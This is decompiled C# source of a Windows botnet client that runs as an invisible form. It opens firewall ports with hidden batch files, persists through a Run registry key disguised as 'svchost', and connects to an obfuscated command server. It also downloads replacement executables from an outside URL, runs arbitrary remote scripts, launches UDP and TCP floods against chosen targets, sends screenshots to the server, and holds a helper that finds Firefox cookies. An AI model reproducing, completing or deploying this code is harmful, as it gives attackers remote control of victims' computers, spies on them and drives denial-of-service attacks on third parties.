using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns1;

namespace ns2;

internal sealed class Form1 : Form
{
	public int int_0 = 36729;

	public float float_0 = 2f;

	public Thread thread_0;

	public IPEndPoint ipendPoint_0;

	public Socket socket_0 = null;

	public NetworkStream networkStream_0;

	public bool bool_0 = false;

	private List<Thread> list_0;

	private bool bool_1 = false;

	private byte[] byte_0;

	private IPEndPoint ipendPoint_1;

	public string string_0 = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());

	public string string_1 = Path.GetFileName(Application.get_ExecutablePath());

	public string string_2 = Application.get_ExecutablePath();

	public string string_3 = Application.get_StartupPath();

	public static string string_4 = "";

	public static int int_1 = -1;

	public static bool bool_2 = false;

	public static List<byte> list_1 = new List<byte>();

	private Thread thread_1;

	private string string_5 = "";

	private static Dictionary<string, CookieContainer> dictionary_0 = new Dictionary<string, CookieContainer>();

	private Thread thread_2;

	private IContainer icontainer_0 = null;

	public Form1(string[] args)
	{
		InitializeComponent();
	}

	public static void smethod_0()
	{
		string_4 = "";
		list_1.Clear();
		bool_2 = false;
		int_1 = -1;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string_5 = smethod_1(Class9.Default.DNS);
		string_5 = string_5.Replace(">", "");
		string_5 = string_5.Replace("~", "");
		string_5 = string_5.Replace("#", "");
		string_5 = string_5.Replace(" ", "");
		string_5 = string_5.Trim();
		string value = "netsh advfirewall firewall add rule name=”Open Port 36729” dir=in action=allow protocol=TCP localport=36729";
		string text = Path.GetTempPath() + "winfirewall45.bat";
		StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine(value);
		streamWriter.Flush();
		streamWriter.Close();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		processStartInfo = null;
		string value2 = "netsh advfirewall firewall add rule name=”" + string_1 + "” dir=in action=allow program=”" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1 + "” enable=yes remoteip=Any,LocalSubnet profile=all";
		string text2 = Path.GetTempPath() + "winfirewall373.bat";
		StreamWriter streamWriter2 = new StreamWriter(text2);
		streamWriter2.WriteLine("@echo off");
		streamWriter2.WriteLine(value2);
		streamWriter2.Flush();
		streamWriter2.Close();
		processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		processStartInfo = null;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("svchost") == null)
		{
			registryKey.SetValue("svchost", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
		}
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1, overwrite: false);
		}
		ipendPoint_0 = new IPEndPoint(Dns.GetHostAddresses(string_5)[0], int_0);
		thread_0 = new Thread(method_1);
		thread_0.IsBackground = true;
		thread_0.Priority = ThreadPriority.Highest;
		method_0(firstAttempt: true);
	}

	public static string smethod_1(string str)
	{
		string text = "";
		char[] array = str.ToCharArray();
		foreach (char c in array)
		{
			string text2 = c.ToString();
			text = text2 switch
			{
				"q" => text + "a", 
				"v" => text + "b", 
				"i" => text + "c", 
				"p" => text + "d", 
				"w" => text + "e", 
				"c" => text + "f", 
				"g" => text + "g", 
				"b" => text + "h", 
				"y" => text + "i", 
				"n" => text + "j", 
				"l" => text + "k", 
				"a" => text + "l", 
				"x" => text + "m", 
				"r" => text + "n", 
				"t" => text + "o", 
				"f" => text + "p", 
				"k" => text + "q", 
				"z" => text + "r", 
				"o" => text + "s", 
				"d" => text + "t", 
				"s" => text + "u", 
				"j" => text + "v", 
				"e" => text + "w", 
				"h" => text + "x", 
				"u" => text + "y", 
				"m" => text + "z", 
				"I" => text + "A", 
				"D" => text + "B", 
				"J" => text + "C", 
				"L" => text + "D", 
				"W" => text + "E", 
				"Z" => text + "F", 
				"G" => text + "G", 
				"U" => text + "H", 
				"S" => text + "I", 
				"C" => text + "J", 
				"Q" => text + "K", 
				"V" => text + "L", 
				"X" => text + "M", 
				"T" => text + "N", 
				"P" => text + "O", 
				"B" => text + "P", 
				"E" => text + "Q", 
				"K" => text + "R", 
				"H" => text + "S", 
				"M" => text + "T", 
				"Y" => text + "U", 
				"F" => text + "V", 
				"A" => text + "W", 
				"O" => text + "X", 
				"N" => text + "Y", 
				"R" => text + "Z", 
				"-" => text + "!", 
				"=" => text + "@", 
				"~" => text + "#", 
				"," => text + "$", 
				"_" => text + "%", 
				"`" => text + "^", 
				"*" => text + "&", 
				"!" => text + "*", 
				"+" => text + "(", 
				"%" => text + ")", 
				";" => text + "_", 
				"/" => text + "-", 
				"&" => text + "=", 
				"." => text + "+", 
				"}" => text + "<", 
				"#" => text + ">", 
				":" => text + "?", 
				"{" => text + ",", 
				"(" => text + ".", 
				"<" => text + ";", 
				")" => text + ":", 
				"$" => text + "'", 
				"'" => text + "/", 
				"?" => text + "}", 
				"@" => text + "{", 
				">" => text + "`", 
				"^" => text + "~", 
				"8" => text + "0", 
				"5" => text + "1", 
				"7" => text + "2", 
				"3" => text + "3", 
				"9" => text + "4", 
				"2" => text + "5", 
				"1" => text + "6", 
				"4" => text + "7", 
				"6" => text + "8", 
				"0" => text + "9", 
				_ => text + text2, 
			};
		}
		return text;
	}

	public static string smethod_2(string str)
	{
		string text = "";
		char[] array = str.ToCharArray();
		foreach (char c in array)
		{
			string text2 = c.ToString();
			text = text2 switch
			{
				"a" => text + "q", 
				"b" => text + "v", 
				"c" => text + "i", 
				"d" => text + "p", 
				"e" => text + "w", 
				"f" => text + "c", 
				"g" => text + "g", 
				"h" => text + "b", 
				"i" => text + "y", 
				"j" => text + "n", 
				"k" => text + "l", 
				"l" => text + "a", 
				"m" => text + "x", 
				"n" => text + "r", 
				"o" => text + "t", 
				"p" => text + "f", 
				"q" => text + "k", 
				"r" => text + "z", 
				"s" => text + "o", 
				"t" => text + "d", 
				"u" => text + "s", 
				"v" => text + "j", 
				"w" => text + "e", 
				"x" => text + "h", 
				"y" => text + "u", 
				"z" => text + "m", 
				"A" => text + "I", 
				"B" => text + "D", 
				"C" => text + "J", 
				"D" => text + "L", 
				"E" => text + "W", 
				"F" => text + "Z", 
				"G" => text + "G", 
				"H" => text + "U", 
				"I" => text + "S", 
				"J" => text + "C", 
				"K" => text + "Q", 
				"L" => text + "V", 
				"M" => text + "X", 
				"N" => text + "T", 
				"O" => text + "P", 
				"P" => text + "B", 
				"Q" => text + "E", 
				"R" => text + "K", 
				"S" => text + "H", 
				"T" => text + "M", 
				"U" => text + "Y", 
				"V" => text + "F", 
				"W" => text + "A", 
				"X" => text + "O", 
				"Y" => text + "N", 
				"Z" => text + "R", 
				"!" => text + "-", 
				"@" => text + "=", 
				"#" => text + "~", 
				"$" => text + ",", 
				"%" => text + "_", 
				"^" => text + "`", 
				"&" => text + "*", 
				"*" => text + "!", 
				"(" => text + "+", 
				")" => text + "%", 
				"_" => text + ";", 
				"-" => text + "/", 
				"=" => text + "&", 
				"+" => text + ".", 
				"<" => text + "}", 
				">" => text + "#", 
				"?" => text + ":", 
				"," => text + "{", 
				"." => text + "(", 
				";" => text + "<", 
				":" => text + ")", 
				"'" => text + "$", 
				"/" => text + "'", 
				"}" => text + "?", 
				"{" => text + "@", 
				"`" => text + ">", 
				"~" => text + "^", 
				"0" => text + "8", 
				"1" => text + "5", 
				"2" => text + "7", 
				"3" => text + "3", 
				"4" => text + "9", 
				"5" => text + "2", 
				"6" => text + "1", 
				"7" => text + "4", 
				"8" => text + "6", 
				"9" => text + "0", 
				_ => text + text2, 
			};
		}
		return text;
	}

	public void method_0(bool firstAttempt)
	{
		while (true)
		{
			try
			{
				socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket_0.Connect(ipendPoint_0);
				if (socket_0.Connected)
				{
					networkStream_0 = new NetworkStream(socket_0, ownsSocket: true);
					Class10.smethod_5(networkStream_0, "IBOT", float_0 + "~" + Environment.OSVersion.Platform.ToString() + "|" + Class9.Default.Active);
					if (firstAttempt)
					{
						thread_0.Start();
					}
				}
				break;
			}
			catch
			{
			}
		}
	}

	public void method_1()
	{
		//IL_0610: Unknown result type (might be due to invalid IL or missing references)
		//IL_0617: Expected O, but got Unknown
		while (true)
		{
			smethod_0();
			try
			{
				if (socket_0 == null || !socket_0.Connected)
				{
					continue;
				}
				while (true)
				{
					int num = networkStream_0.ReadByte();
					if (num == -1)
					{
						break;
					}
					if (!bool_2)
					{
						string text = ((char)num).ToString();
						if (text == "!")
						{
							bool_2 = true;
						}
						if (text != "\0" && text != "!")
						{
							string_4 += text;
						}
					}
					else if (bool_2)
					{
						if (int_1 == -1)
						{
							int num2 = string_4.IndexOf(":") + 1;
							int length = string_4.Length;
							string s = string_4.Substring(num2, length - num2);
							int_1 = int.Parse(s);
						}
						if (list_1.Count == int_1)
						{
							break;
						}
						list_1.Add((byte)num);
					}
				}
				if (string_4.Contains("UPDATE"))
				{
					try
					{
						method_2("Updater Initialized!");
						try
						{
							WebClient webClient = new WebClient();
							byte[] bytes = webClient.DownloadData(webClient.Proxy!.GetProxy(new Uri("http://steveschoice.com/Scourge/Infection/svchost.exe")));
							if (File.Exists(string_3 + "\\" + string_0 + ".old"))
							{
								File.Delete(string_3 + "\\" + string_0 + ".old");
							}
							File.Move(string_2, string_3 + "\\" + string_0 + ".old");
							File.WriteAllBytes(string_2, bytes);
							Application.DoEvents();
							BinaryWriter binaryWriter = new BinaryWriter(new FileStream(string_2, FileMode.Open, FileAccess.Write));
							binaryWriter.Seek(int.Parse(Class10.smethod_2(list_1.ToArray())), SeekOrigin.Begin);
							binaryWriter.Write(smethod_2(string_5).ToCharArray());
							binaryWriter.Flush();
							binaryWriter.Close();
							Application.Restart();
						}
						catch
						{
							method_2("Failed Updating!");
						}
					}
					catch
					{
					}
				}
				if (string_4.Contains("SCRPT"))
				{
					try
					{
						string value = Class10.smethod_2(list_1.ToArray());
						string text2 = Path.GetTempPath() + "bScript.bat";
						StreamWriter streamWriter = new StreamWriter(text2);
						streamWriter.WriteLine("@echo off");
						streamWriter.WriteLine(value);
						streamWriter.Flush();
						streamWriter.Close();
						ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
						processStartInfo.CreateNoWindow = true;
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo);
						processStartInfo = null;
						method_2("Script compiled sucessfully!");
					}
					catch
					{
						method_2("Script Failed!");
					}
				}
				if (string_4.Contains("STPCS"))
				{
					bool_0 = true;
				}
				if (string_4.Contains("IOT"))
				{
					socket_0.Disconnect(reuseSocket: true);
					method_0(firstAttempt: false);
				}
				if (string_4.Contains("SETDNS"))
				{
					Class9.Default.DNS = smethod_2(Class10.smethod_2(list_1.ToArray()));
					((SettingsBase)Class9.Default).Save();
					Application.Restart();
				}
				if (string_4.Contains("ACTVTE"))
				{
					Class9.Default.Active = true;
					((SettingsBase)Class9.Default).Save();
					Class10.smethod_5(networkStream_0, "UPACTSTAT", "True");
				}
				if (string_4.Contains("DEACTVTE"))
				{
					Class9.Default.Active = false;
					((SettingsBase)Class9.Default).Save();
					Class10.smethod_5(networkStream_0, "UPACTSTAT", "False");
				}
				if (string_4.Contains("STPFLD"))
				{
					bool_1 = false;
					Thread[] array = list_0.ToArray();
					foreach (Thread thread in array)
					{
						thread.Abort();
					}
					if (thread_1 != null)
					{
						thread_1.Abort();
					}
					method_2("Idle");
				}
				if (string_4.Contains("DDOS") && Class9.Default.Active)
				{
					try
					{
						string text3 = "";
						string text4 = "";
						string text5 = "";
						string text6 = "";
						string text7 = Class10.smethod_2(list_1.ToArray());
						int num3 = text7.IndexOf("~");
						int num4 = text7.IndexOf("`");
						int num5 = text7.IndexOf("|");
						text3 = text7.Substring(0, num3);
						text4 = text7.Substring(num3 + 1, num4 - (num3 + 1));
						text5 = text7.Substring(num4 + 1, num5 - (num4 + 1));
						text6 = text7.Substring(num5 + 1, text7.Length - (num5 + 1));
						method_3(text3, text4, new IPEndPoint(IPAddress.Parse(text5), int.Parse(text6)));
					}
					catch
					{
						method_2("Flooder Failed!");
					}
				}
				if (string_4.Contains("ERASE"))
				{
					try
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						if (registryKey.GetValue("svchost") != null)
						{
							registryKey.DeleteValue("svchost");
						}
						File.Move(string_2, string_3 + "\\" + string_0 + ".old");
						Application.Exit();
					}
					catch
					{
						method_2("Removal of this bot failed!");
					}
				}
				if (string_4.Contains("SCSPU"))
				{
					try
					{
						Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.set_CompositingMode((CompositingMode)1);
						val2.set_CompositingQuality((CompositingQuality)1);
						val2.set_SmoothingMode((SmoothingMode)1);
						val2.set_InterpolationMode((InterpolationMode)1);
						val2.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size);
						MemoryStream memoryStream = new MemoryStream();
						((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
						byte[] data = memoryStream.ToArray();
						val2.Dispose();
						((Image)val).Dispose();
						memoryStream.Close();
						memoryStream.Dispose();
						Class10.smethod_4(networkStream_0, "RECIFB", data);
						Class10.smethod_4(networkStream_0, "RECIFB", data);
					}
					catch
					{
						method_2("Error while sending picture!");
					}
				}
			}
			catch
			{
				socket_0.Disconnect(reuseSocket: true);
				method_0(firstAttempt: false);
			}
		}
	}

	public void method_2(string stat)
	{
		Class10.smethod_5(networkStream_0, "UPSTAT", stat);
	}

	private static string smethod_3()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath += "\\Mozilla\\Firefox\\Profiles\\";
		DirectoryInfo directoryInfo = new DirectoryInfo(folderPath);
		DirectoryInfo[] directories = directoryInfo.GetDirectories("*.default");
		if (directories.Length != 1)
		{
			return string.Empty;
		}
		folderPath = folderPath + directories[0].Name + "\\cookies.sqlite";
		if (!File.Exists(folderPath))
		{
			return string.Empty;
		}
		return folderPath;
	}

	public void method_3(string Type, string Force, IPEndPoint ipEndPoint)
	{
		method_2("Flooding victim!");
		ipendPoint_1 = ipEndPoint;
		MemoryStream memoryStream = new MemoryStream(Class11.Sender);
		BinaryReader binaryReader = new BinaryReader(memoryStream);
		byte_0 = binaryReader.ReadBytes(512000);
		memoryStream.Dispose();
		list_0 = new List<Thread>();
		switch (Type)
		{
		case "HTTP":
			thread_2 = new Thread(method_4);
			thread_2.IsBackground = true;
			thread_2.Start();
			bool_1 = true;
			break;
		case "TCP":
			thread_1 = new Thread(method_5);
			thread_1.IsBackground = true;
			thread_1.Start();
			bool_1 = true;
			break;
		case "UDP":
		{
			int num = 0;
			num = Force switch
			{
				"Low" => 3, 
				"Medium" => 7, 
				"High" => 10, 
				"Super" => 13, 
				"Extreme" => 35, 
				"Damaging" => 50, 
				_ => 0, 
			};
			for (int i = 0; i < num; i++)
			{
				list_0.Add(new Thread(method_6));
				list_0[i].IsBackground = true;
				list_0[i].Start();
			}
			bool_1 = true;
			break;
		}
		}
	}

	public void method_4()
	{
	}

	private void method_5()
	{
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
		socket.Connect(ipendPoint_1);
		while (bool_1)
		{
			try
			{
				socket.Send(byte_0);
				if (!socket_0.Connected)
				{
					bool_1 = false;
					method_0(firstAttempt: false);
				}
			}
			catch
			{
			}
		}
	}

	private void method_6()
	{
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
		while (bool_1)
		{
			try
			{
				socket.SendTo(byte_0, SocketFlags.None, ipendPoint_1);
				if (!socket_0.Connected)
				{
					bool_1 = false;
					method_0(firstAttempt: false);
				}
			}
			catch
			{
			}
		}
	}

	private void method_7(object sender, FormClosingEventArgs e)
	{
		method_8();
		Application.DoEvents();
	}

	public void method_8()
	{
		if (socket_0.Connected)
		{
			Class10.smethod_3(networkStream_0, "GBIMOT");
			socket_0.Disconnect(reuseSocket: true);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Control)this).set_AccessibleRole((AccessibleRole)0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
